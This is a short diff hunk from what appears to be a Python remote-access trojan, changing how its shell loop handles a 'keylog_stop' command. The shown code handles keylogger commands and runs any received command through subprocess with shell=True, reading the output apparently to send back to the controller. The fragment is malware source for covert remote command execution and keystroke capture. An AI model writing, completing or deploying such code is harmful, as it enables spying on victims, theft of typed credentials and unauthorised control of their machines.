@@ -35,7 +35,7 @@ def shell():
             send(keys)
         elif command[:11] == "keylog_stop":
             klog.destruct()
-            send("Keylogger finished")
+            break
         else:
             execute = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
             result = execute.stdout.read() + execute.stderr.read()
